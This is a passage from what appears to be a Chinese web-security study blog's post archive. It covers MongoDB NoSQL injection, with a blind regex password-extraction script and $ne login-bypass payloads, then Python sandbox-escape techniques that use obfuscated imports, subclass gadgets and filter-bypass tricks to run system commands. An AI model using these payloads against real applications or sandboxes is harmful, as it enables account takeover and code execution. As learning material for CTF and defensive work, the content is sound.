class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.226.148/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># When the method is GET</span></span><br><span class="line">            get_payload = <span class="string">&#x27;?username=admin&amp;password[$regex]=^%s&#x27;</span> % (password + c)</span><br><span class="line">            <span class="comment"># When the method is POST</span></span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&#x27;^&#x27;</span> + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># When the method is POST with JSON</span></span><br><span class="line">            json_payload = <span class="string">&quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;$regex&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot;</span> % (password + c)</span><br><span class="line">            <span class="comment">#headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span></span><br><span class="line">            <span class="comment">#r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span></span><br><span class="line"></span><br><span class="line">            r = requests.post(url=url, data=post_payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Login Success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] %s&quot;</span> % (password + c))</span><br><span class="line">                password += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出如下: </span></span><br><span class="line"><span class="comment"># [+] 1</span></span><br><span class="line"><span class="comment"># [+] 12</span></span><br><span class="line"><span class="comment"># [+] 123</span></span><br><span class="line"><span class="comment"># [+] 1234</span></span><br><span class="line"><span class="comment"># [+] 12345</span></span><br><span class="line"><span class="comment"># [+] 123456</span></span><br></pre></td></tr></table></figure><h2 id="3-Nodejs中的MongoDB注入"><a href="#3-Nodejs中的MongoDB注入" class="headerlink" title="3.Nodejs中的MongoDB注入"></a>3.Nodejs中的MongoDB注入</h2><p>其中主要是重言式注入(json形式)，通过构造永真式构造万能密码实现登录绕过</p><p>由于后端解析 JSON，所以我们发送 JSON 格式的 payload：</p><p><code>&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></p><p>若过滤严格,可以尝试使用 Unicode 编码绕过，因为 JSON 可以直接解析 Unicode。如下所示：</p><p><code>&#123;&quot;username&quot;:&#123;&quot;\u0024\u006e\u0065&quot;:1&#125;,&quot;password&quot;: &#123;&quot;\u0024\u006e\u0065&quot;:1&#125;&#125; // &#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-Python沙箱逃逸</title>
      <link href="/2024/02/28/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-py%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/02/28/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-py%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>详解:<a href="https://www.freebuf.com/articles/system/203208.html">https://www.freebuf.com/articles/system/203208.html</a></p><p>为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数和模块，例如 os</p><p>沙箱逃逸就是绕过某些函数，特殊字符串，或模块的限制，达到一个漏洞环境</p><h2 id="1-Python命令执行"><a href="#1-Python命令执行" class="headerlink" title="1.Python命令执行"></a>1.Python命令执行</h2><p>在 Python 中执行系统命令的方式有：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">os</span><br><span class="line"></span><br><span class="line">commands：仅限<span class="number">2.</span>x</span><br><span class="line"></span><br><span class="line">subprocess</span><br><span class="line"></span><br><span class="line">timeit：timeit.sys、timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">platform：platform.os、platform.sys、platform.popen(<span class="string">&#x27;whoami&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>, bufsize=-<span class="number">1</span>).read()</span><br><span class="line"></span><br><span class="line">pty：pty.spawn(<span class="string">&#x27;ls&#x27;</span>)、pty.os</span><br><span class="line"></span><br><span class="line">bdb：bdb.os、cgi.sys</span><br><span class="line"></span><br><span class="line">cgi：cgi.os、cgi.sys</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="2-命令执行沙箱逃逸"><a href="#2-命令执行沙箱逃逸" class="headerlink" title="2.命令执行沙箱逃逸"></a>2.命令执行沙箱逃逸</h2><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><ul><li>禁用<code>import os</code>肯定是不行的:</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">import</span>   os</span><br><span class="line"><span class="keyword">import</span>    os</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li><p>如果多个空格也过滤了,还有<code>__import__：__import__(&#39;os&#39;)</code>，<code>importlib：importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code></p></li><li><p>甚至可以用 execfile 来代替：</p></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">exec</span>(f.read())</span><br><span class="line">system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>不过要使用上面的方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被过滤的话，还可以确认一下：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.path)</span><br></pre></td></tr></table></figure><h3 id="处理字符串"><a href="#处理字符串" class="headerlink" title="处理字符串"></a>处理字符串</h3><p>代码中要是出现 os，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p><ul><li>字符串数组逆序</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>字符串拼接</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;s&#x27;</span></span><br><span class="line"><span class="built_in">__import__</span>(a+b).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>还可以利用 eval 或者 exec：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">yan</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">yan</span><br></pre></td></tr></table></figure><p>eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤</p><p>因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>] </span><br><span class="line">[<span class="string">&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;</span>]</span><br><span class="line">[<span class="string">u&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;X19idWlsdGluc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)]</span><br><span class="line">[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;__buil&#x27;</span><span class="string">&#x27;tins__&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;__buil&#x27;</span>.__add__(<span class="string">&#x27;tins__&#x27;</span>)]</span><br><span class="line">[<span class="string">&quot;_builtins_&quot;</span>.join(<span class="string">&quot;__&quot;</span>)]</span><br><span class="line">[<span class="string">&#x27;%c%c%c%c%c%c%c%c%c%c%c%c&#x27;</span> % (<span class="number">95</span>, <span class="number">95</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">95</span>)]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a>恢复 sys.modules</h3><p>利用<code>del sys.modules[&#39;os&#39;]</code>，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p><p>所以删了<code>sys.modules[&#39;os&#39;]</code>会让 Python 重新加载一次 os。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span> <span class="comment"># oj 为你加的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h3><ul><li>os 中能够执行系统命令的函数：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()) </span><br><span class="line"><span class="built_in">print</span>(os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line"><span class="built_in">print</span>(os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line"><span class="built_in">print</span>(os.popen4(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>通过 getattr 拿到对象的方法、属性：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">getattr</span>(os, <span class="string">&#x27;metsys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不出现 import 也可以：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(__builtins__, <span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;metsys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">yan</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h3><p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫内建模块（或者叫内建命名空间）的东西，它有一些常用函数，变量和类</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>这里稍微解释下<code>x.__dict__</code>，它是 x 内部所有属性名和属性值组成的字典，有以下特点：</p><ol><li>内置的数据类型没有 <code>__dict__</code> 属性</li><li>每个类有自己的 <code>__dict__</code> 属性，就算存着继承关系，父类的 <code>__dict__</code> 并不会影响子类的 <code>__dict__</code></li><li>对象也有自己的 <code>__dict__</code> 属性，包含 <code>self.xxx</code> 这种实例属性</li></ol><p>那么既然<code>__builtins__</code>有这么多危险的函数，后台可能将里面的危险函数破坏了：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br></pre></td></tr></table></figure><p>或者直接删了：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure><p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。</p><p>不过，我们在使用 <code>reload</code> 的时候也没导入，说明 <code>reload</code>也在 <code>__builtins__</code>里</p><p>那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。</p><p>还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过</p><h3 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h3><p>利用<code>.__mro__</code>或<code>.mro()</code>，记录了继承关系：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><h2 id="3-文件读写沙箱逃逸"><a href="#3-文件读写沙箱逃逸" class="headerlink" title="3.文件读写沙箱逃逸"></a>3.文件读写沙箱逃逸</h2><p>2.x 有个内建的 file：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;Macr0phag3\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;Macr0phag3&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;Macr0phag3&#x27;</span></span><br></pre></td></tr></table></figure><p>还有个 open，2.x 与 3.x 通用。</p><p>还有一些库，例如：<code>types.FileType(rw)、platform.popen(rw)、linecache.getlines(r)</code>。</p><p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为math.py，然后 import 进来：</p><p>math.py：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;whoami&#x27;</span>))</span><br></pre></td></tr></table></figure><p>调用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line">yan</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在sys.modules中有的，这些库无法这样利用，会直接从sys.modules中加入，比如re：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;re&#x27;</span> <span class="keyword">in</span> sys.modules</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;math&#x27;</span> <span class="keyword">in</span> sys.modules</span><br><span class="line"><span class="literal">False</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>当然在import re 之前使用<code>del sys.modules[&#39;re&#39;]</code>也不是不可以…</p><p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 test的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p><p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;yan\n&#x27;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;yan&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="4-其他"><a href="#4-其他" class="headerlink" title="4.其他"></a>4.其他</h2><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>应对的方式就是将<code>[]</code>的功能用 <code>pop、__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.get(<span class="string">&#x27;linecache&#x27;</span>).os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;macr0phag3\n&#x27;</span></span><br></pre></td></tr></table></figure><p>当然，dict 也是可以 pop 的：<code>&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)</code></p><p>当然也可以用 <code>next(iter())</code> 替代，或许可以加上 max 之类的玩意。</p><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><ul><li>最简单就是用 <code>chr</code></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">104</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>扣字符</li></ul><p>利用 str 和 []，挨个把字符拼接出来</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>当然 <code>[]</code> 如果被过滤了也可以 bypass，前面说过了。<br>如果 <code>str</code> 被过滤了怎么办呢？<code>type(&#39;&#39;)()、format()</code> 即可。同理，<code>int、list</code> 都可以用 <code>type</code> 构造出来。</p><ul><li>格式化字符串</li></ul><p>那过滤了引号，格式化字符串还能用吗？</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">chr</span>(<span class="number">37</span>)+<span class="built_in">str</span>(&#123;&#125;.__class__)[<span class="number">1</span>])%<span class="number">100</span> == <span class="string">&#x27;d&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>dict() 拿键</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;whoami&#x27;</span> ==</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] ==</span><br><span class="line"><span class="built_in">str</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">2</span>:<span class="number">8</span>] ==</span><br></pre></td></tr></table></figure><h3 id="限制数字"><a href="#限制数字" class="headerlink" title="限制数字"></a>限制数字</h3><p>上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：</p><ul><li>0：int(bool([]))、Flase、len([])、any(())</li><li>1：int(bool([“”]))、True、all(())、int(list(list(dict(a၁&#x3D;())).pop()).pop())</li><li>获取稍微大的数字：len(str({}.keys))，不过需要慢慢找长度符合的字符串</li><li>1.0：float(True)</li><li>-1：~0</li><li>…</li></ul><p>其实有了 0 就可以了，要啥整数直接做运算即可：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> ** <span class="number">0</span> == <span class="number">1</span></span><br><span class="line"><span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span></span><br><span class="line"><span class="number">2</span> + <span class="number">1</span> == <span class="number">3</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">2</span> == <span class="number">4</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意…</p><h3 id="限制空格"><a href="#限制空格" class="headerlink" title="限制空格"></a>限制空格</h3><p>空格通常来说可以通过 <code>()</code>、<code>[]</code> 替换掉。例如：</p><p><code>[i for i in range(10) if i == 5]</code> 可以替换为 <code>[[i][0]for(i)in(range(10))if(i)==5]</code></p><h3 id="限制运算符"><a href="#限制运算符" class="headerlink" title="限制运算符"></a>限制运算符</h3><p><code>&gt; &lt; ! - +</code> 这几个比较简单就不说了。</p><p><code>==</code> 可以用 <code>in</code> 来替换。</p><ul><li>替换 <code>or</code> 的测试代码</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">or</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> | <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;- <span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> - <span 